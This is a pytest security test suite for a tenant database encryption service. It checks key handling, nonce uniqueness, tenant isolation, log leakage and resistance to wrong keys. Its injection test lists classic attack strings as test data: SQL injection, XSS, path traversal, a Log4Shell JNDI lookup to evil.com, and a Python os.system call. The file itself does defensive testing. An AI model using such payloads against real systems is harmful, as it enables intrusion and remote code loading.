"""
Security and penetration tests for tenant database encryption.

Tests key protection, access control, data leakage prevention,
encryption strength validation, and compliance with security standards.
"""

import pytest
import os
import gc
import sys
import base64
import json
import tempfile
import subprocess
import statistics
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, MagicMock
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from core.services.encryption_service import EncryptionService
from core.services.key_management_service import KeyManagementService
from core.utils.column_encryptor import EncryptedColumn, EncryptedJSON
from core.models.database import set_tenant_context, clear_tenant_context
from core.exceptions.encryption_exceptions import (
    EncryptionError,
    DecryptionError,
    KeyNotFoundError
)


class TestKeyProtectionSecurity:
    """Test security aspects of key protection and access control."""

    @pytest.fixture
    def encryption_service(self):
        """Create encryption service for security testing."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "security-test-key-material"
            mock_kms.return_value = mock_kms_instance
            
            return EncryptionService(), mock_kms_instance

    def test_key_material_not_exposed_in_memory_dumps(self, encryption_service):
        """Test that key material is not easily extractable from memory dumps."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        # Perform encryption operations
        sensitive_data = "highly confidential information"
        encrypted = service.encrypt_data(sensitive_data, 1)
        decrypted = service.decrypt_data(encrypted, 1)
        
        assert decrypted == sensitive_data
        
        # Check that key material isn't in service attributes as plain text
        service_dict = service.__dict__
        for key, value in service_dict.items():
            if isinstance(value, str):
                assert "security-test-key-material" not in value, \
                    f"Key material found in service attribute: {key}"
        
        # Check cache doesn't store keys as plain strings
        cache_stats = service.get_cache_stats()
        if cache_stats['cached_keys'] > 0:
            # Keys should be stored as bytes, not strings
            for tenant_id, cached_key in service._key_cache.items():
                assert isinstance(cached_key, bytes), \
                    f"Cached key for tenant {tenant_id} is not bytes type"
                assert len(cached_key) == 32, \
                    f"Cached key for tenant {tenant_id} has wrong length: {len(cached_key)}"
        
        clear_tenant_context()

    def test_key_derivation_security(self, encryption_service):
        """Test security properties of key derivation."""
        service, mock_kms = encryption_service
        
        # Test that same input produces same output (deterministic)
        key1 = service._derive_key("test-material", 1)
        key2 = service._derive_key("test-material", 1)
        assert key1 == key2, "Key derivation should be deterministic"
        
        # Test that different inputs produce different outputs
        key_different_material = service._derive_key("different-material", 1)
        key_different_tenant = service._derive_key("test-material", 2)
        
        assert key1 != key_different_material, "Different key material should produce different keys"
        assert key1 != key_different_tenant, "Different tenant ID should produce different keys"
        
        # Test key length (should be 32 bytes for AES-256)
        assert len(key1) == 32, f"Derived key should be 32 bytes, got {len(key1)}"
        
        # Test key entropy (derived key should appear random)
        # Simple entropy test: check that not all bytes are the same
        unique_bytes = len(set(key1))
        assert unique_bytes > 10, f"Derived key has low entropy: {unique_bytes} unique bytes"
    def test_nonce_security_properties(self, encryption_service):
        """Test security properties of encryption nonces."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        # Collect nonces from multiple encryptions
        nonces = []
        data = "test data for nonce analysis"
        
        for _ in range(100):
            encrypted = service.encrypt_data(data, 1)
            # Extract nonce (first 12 bytes after base64 decode)
            decoded = base64.b64decode(encrypted)
            nonce = decoded[:12]
            nonces.append(nonce)
        
        # Test nonce uniqueness
        unique_nonces = set(nonces)
        assert len(unique_nonces) == len(nonces), \
            f"Nonce collision detected: {len(unique_nonces)} unique out of {len(nonces)}"
        
        # Test nonce length
        for nonce in nonces:
            assert len(nonce) == 12, f"Nonce should be 12 bytes, got {len(nonce)}"
        
        # Test nonce randomness (simple entropy check)
        for nonce in nonces[:10]:  # Check first 10 nonces
            unique_bytes = len(set(nonce))
            assert unique_bytes > 6, f"Nonce has low entropy: {unique_bytes} unique bytes"
        
        clear_tenant_context()

    def test_unauthorized_key_access_prevention(self, encryption_service):
        """Test prevention of unauthorized key access."""
        service, mock_kms = encryption_service
        
        # Test access without tenant context
        clear_tenant_context()
        
        with pytest.raises((EncryptionError, KeyNotFoundError)):
            service.encrypt_data("test data", 1)
        
        # Test access with wrong tenant context
        set_tenant_context(1)
        encrypted_t1 = service.encrypt_data("test data", 1)
        
        set_tenant_context(2)
        # Should not be able to decrypt tenant 1's data with tenant 2's context
        with pytest.raises((DecryptionError, KeyNotFoundError)):
            service.decrypt_data(encrypted_t1, 2)
        
        clear_tenant_context()

    def test_key_cache_security(self, encryption_service):
        """Test security aspects of key caching."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        # Load key into cache
        service.get_tenant_key(1)
        
        # Verify key is cached
        stats = service.get_cache_stats()
        assert stats['cached_keys'] == 1
        
        # Test cache isolation between tenants
        set_tenant_context(2)
        service.get_tenant_key(2)
        
        stats = service.get_cache_stats()
        assert stats['cached_keys'] == 2
        
        # Verify tenant 1 and 2 have different cached keys
        key1 = service._key_cache.get(1)
        key2 = service._key_cache.get(2)
        assert key1 != key2, "Cached keys should be different for different tenants"
        
        # Test cache clearing security
        service.clear_cache(1)
        assert 1 not in service._key_cache, "Cache should be cleared for tenant 1"
        assert 2 in service._key_cache, "Cache should still contain tenant 2 key"
        
        # Test complete cache clearing
        service.clear_cache()
        assert len(service._key_cache) == 0, "All cache should be cleared"
        
        clear_tenant_context()


class TestDataLeakagePrevention:
    """Test prevention of data leakage in various scenarios."""

    @pytest.fixture
    def encryption_service(self):
        """Create encryption service for data leakage testing."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "leakage-test-key"
            mock_kms.return_value = mock_kms_instance
            
            return EncryptionService(), mock_kms_instance

    def test_no_plaintext_in_logs(self, encryption_service, caplog):
        """Test that plaintext data doesn't appear in logs."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        sensitive_data = "credit_card_number_4532123456789012"
        
        with caplog.at_level("DEBUG"):
            encrypted = service.encrypt_data(sensitive_data, 1)
            decrypted = service.decrypt_data(encrypted, 1)
        
        # Check all log messages
        log_text = caplog.text.lower()
        
        # Sensitive data should not appear in logs
        assert "4532123456789012" not in log_text, "Credit card number found in logs"
        assert "credit_card_number" not in log_text, "Sensitive field name found in logs"
        
        # Key material should not appear in logs
        assert "leakage-test-key" not in log_text, "Key material found in logs"
        
        clear_tenant_context()

    def test_no_plaintext_in_error_messages(self, encryption_service):
        """Test that error messages don't contain plaintext data."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        sensitive_data = "social_security_number_123456789"
        
        # Create scenario that will cause decryption error
        mock_kms.retrieve_tenant_key.side_effect = Exception("Key retrieval failed")
        
        try:
            service.encrypt_data(sensitive_data, 1)
        except Exception as e:
            error_message = str(e).lower()
            
            # Sensitive data should not be in error message
            assert "123456789" not in error_message, "SSN found in error message"
            assert "social_security" not in error_message, "Sensitive field name in error message"
            assert "leakage-test-key" not in error_message, "Key material in error message"
        
        clear_tenant_context()

    def test_memory_cleanup_after_operations(self, encryption_service):
        """Test that sensitive data is cleaned from memory after operations."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        sensitive_data = "confidential_business_data_xyz123"
        
        # Perform encryption/decryption
        encrypted = service.encrypt_data(sensitive_data, 1)
        decrypted = service.decrypt_data(encrypted, 1)
        
        assert decrypted == sensitive_data
        
        # Force garbage collection
        gc.collect()
        
        # Clear caches
        service.clear_cache()
        
        # Check that service doesn't retain plaintext
        service_vars = vars(service)
        for var_name, var_value in service_vars.items():
            if isinstance(var_value, str):
                assert sensitive_data not in var_value, \
                    f"Sensitive data found in service variable: {var_name}"
        
        clear_tenant_context()


class TestEncryptionStrengthValidation:
    """Test encryption strength and cryptographic security."""

    @pytest.fixture
    def encryption_service(self):
        """Create encryption service for strength testing."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "strength-test-key-material"
            mock_kms.return_value = mock_kms_instance
            
            return EncryptionService(), mock_kms_instance

    def test_encryption_algorithm_strength(self, encryption_service):
        """Test that strong encryption algorithms are used."""
        service, mock_kms = encryption_service
        
        # Verify AES-GCM is being used
        assert service.cipher_class == AESGCM, "Should use AES-GCM encryption"
        
        # Test key length (should be 256-bit)
        set_tenant_context(1)
        key = service.get_tenant_key(1)
        assert len(key) == 32, f"Key should be 32 bytes (256-bit), got {len(key)}"
        
        clear_tenant_context()

    def test_ciphertext_randomness(self, encryption_service):
        """Test that ciphertext appears random and doesn't reveal patterns."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        # Test with repeated data
        repeated_data = "A" * 1000
        encrypted_values = []
        
        for _ in range(10):
            encrypted = service.encrypt_data(repeated_data, 1)
            encrypted_values.append(encrypted)
        
        # All encrypted values should be different (due to random nonces)
        unique_encrypted = set(encrypted_values)
        assert len(unique_encrypted) == len(encrypted_values), \
            "Encrypted values should all be different due to random nonces"
        
        # Test with similar data
        similar_data = [
            "password123",
            "password124", 
            "password125"
        ]
        
        encrypted_similar = []
        for data in similar_data:
            encrypted = service.encrypt_data(data, 1)
            encrypted_similar.append(encrypted)
        
        # Encrypted values of similar data should be completely different
        for i in range(len(encrypted_similar)):
            for j in range(i + 1, len(encrypted_similar)):
                # Calculate Hamming distance (number of different characters)
                enc1, enc2 = encrypted_similar[i], encrypted_similar[j]
                min_len = min(len(enc1), len(enc2))
                differences = sum(c1 != c2 for c1, c2 in zip(enc1[:min_len], enc2[:min_len]))
                difference_ratio = differences / min_len
                
                # Should have high difference ratio (>50% different characters)
                assert difference_ratio > 0.5, \
                    f"Encrypted similar data too similar: {difference_ratio:.2%} different"
        
        clear_tenant_context()

    def test_avalanche_effect(self, encryption_service):
        """Test avalanche effect - small input changes cause large output changes."""
        service, mock_kms = encryption_service
        set_tenant_context(1)
        
        # Test with single bit change
        original_data = "avalanche_test_data_12345"
        modified_data = "avalanche_test_data_12346"  # Changed last character
        
        encrypted_original = service.encrypt_data(original_data, 1)
        encrypted_modified = service.encrypt_data(modified_data, 1)
        
        # Decode to compare binary data
        binary_original = base64.b64decode(encrypted_original)
        binary_modified = base64.b64decode(encrypted_modified)
        
        # Calculate bit differences
        min_len = min(len(binary_original), len(binary_modified))
        bit_differences = 0
        
        for i in range(min_len):
            # XOR bytes and count set bits
            xor_result = binary_original[i] ^ binary_modified[i]
            bit_differences += bin(xor_result).count('1')
        
        total_bits = min_len * 8
        difference_ratio = bit_differences / total_bits
        
        # Good avalanche effect should change ~50% of bits
        assert difference_ratio > 0.3, \
            f"Avalanche effect too weak: {difference_ratio:.2%} bits changed"
        assert difference_ratio < 0.7, \
            f"Avalanche effect too strong (suspicious): {difference_ratio:.2%} bits changed"
        
        clear_tenant_context()


class TestComplianceValidation:
    """Test compliance with security standards and regulations."""

    def test_fips_140_2_compliance_indicators(self):
        """Test indicators of FIPS 140-2 compliance."""
        # Test that approved algorithms are used
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        
        # These are FIPS 140-2 approved algorithms
        assert AESGCM is not None, "AES-GCM should be available"
        assert hashes.SHA256 is not None, "SHA-256 should be available"
        assert PBKDF2HMAC is not None, "PBKDF2 should be available"
        
        # Test key sizes
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "fips-test-key"
            mock_kms.return_value = mock_kms_instance
            
            service = EncryptionService()
            set_tenant_context(1)
            
            key = service.get_tenant_key(1)
            # FIPS 140-2 requires minimum 112-bit security strength
            # AES-256 provides 256-bit keys
            assert len(key) == 32, f"Key should be 32 bytes (256-bit), got {len(key)}"
            
            clear_tenant_context()

    def test_gdpr_compliance_features(self):
        """Test GDPR compliance features."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "gdpr-test-key"
            mock_kms.return_value = mock_kms_instance
            
            service = EncryptionService()
            set_tenant_context(1)
            
            # Test data encryption (Article 32 - Security of processing)
            personal_data = "john.doe@example.com"
            encrypted = service.encrypt_data(personal_data, 1)
            
            # Data should be encrypted
            assert encrypted != personal_data
            assert len(encrypted) > len(personal_data)
            
            # Test data portability (Article 20)
            decrypted = service.decrypt_data(encrypted, 1)
            assert decrypted == personal_data
            
            clear_tenant_context()

    def test_audit_trail_completeness(self, caplog):
        """Test completeness of audit trails for compliance."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "audit-test-key"
            mock_kms.return_value = mock_kms_instance
            
            service = EncryptionService()
            set_tenant_context(1)
            
            with caplog.at_level("INFO"):
                # Perform various operations
                service.encrypt_data("audit test data", 1)
                service.get_tenant_key(1)
                service.clear_cache(1)
            
            # Check that operations are logged
            log_messages = [record.message for record in caplog.records]
            
            # Should have initialization log
            init_logs = [msg for msg in log_messages if "initialized" in msg.lower()]
            assert len(init_logs) > 0, "Service initialization should be logged"
            
            # Should have cache operation logs
            cache_logs = [msg for msg in log_messages if "cache" in msg.lower()]
            assert len(cache_logs) > 0, "Cache operations should be logged"
            
            clear_tenant_context()


class TestPenetrationTestingScenarios:
    """Penetration testing scenarios for encryption system."""

    def test_brute_force_resistance(self):
        """Test resistance to brute force attacks."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "brute-force-test-key"
            mock_kms.return_value = mock_kms_instance
            
            service = EncryptionService()
            set_tenant_context(1)
            
            # Encrypt data
            plaintext = "brute_force_target_data"
            encrypted = service.encrypt_data(plaintext, 1)
            
            # Simulate brute force attempt with wrong keys
            wrong_keys = [
                "wrong-key-1",
                "wrong-key-2", 
                "wrong-key-3",
                "brute-force-test-key-wrong",
                ""
            ]
            
            for wrong_key in wrong_keys:
                mock_kms_instance.retrieve_tenant_key.return_value = wrong_key
                service.clear_cache()  # Force key reload
                
                # Should fail to decrypt with wrong key
                with pytest.raises((DecryptionError, Exception)):
                    service.decrypt_data(encrypted, 1)
            
            # Restore correct key
            mock_kms_instance.retrieve_tenant_key.return_value = "brute-force-test-key"
            service.clear_cache()
            
            # Should work with correct key
            decrypted = service.decrypt_data(encrypted, 1)
            assert decrypted == plaintext
            
            clear_tenant_context()

    def test_injection_attack_resistance(self):
        """Test resistance to injection attacks through encrypted data."""
        with patch('core.services.key_management_service.KeyManagementService') as mock_kms:
            mock_kms_instance = Mock()
            mock_kms_instance.retrieve_tenant_key.return_value = "injection-test-key"
            mock_kms.return_value = mock_kms_instance
            
            service = EncryptionService()
            set_tenant_context(1)
            
            # Test with potential injection payloads
            injection_payloads = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}",
                "__import__('os').system('ls')"
            ]
            
            for payload in injection_payloads:
                # Encrypt the payload
                encrypted = service.encrypt_data(payload, 1)
                
                # Encrypted data should not contain the original payload
                assert payload not in encrypted, \
                    f"Payload found in encrypted data: {payload}"
                
                # Decrypt should return original payload safely
                decrypted = service.decrypt_data(encrypted, 1)
                assert decrypted == payload, \
                    f"Decryption failed for payload: {payload}"
                
                # Test JSON encryption with injection payloads
                json_payload = {"malicious": payload, "normal": "data"}
                encrypted_json = service.encrypt_json(json_payload, 1)
                decrypted_json = service.decrypt_json(encrypted_json, 1)
                
                assert decrypted_json == json_payload, \
                    f"JSON decryption failed for payload: {payload}"
            
            clear_tenant_context()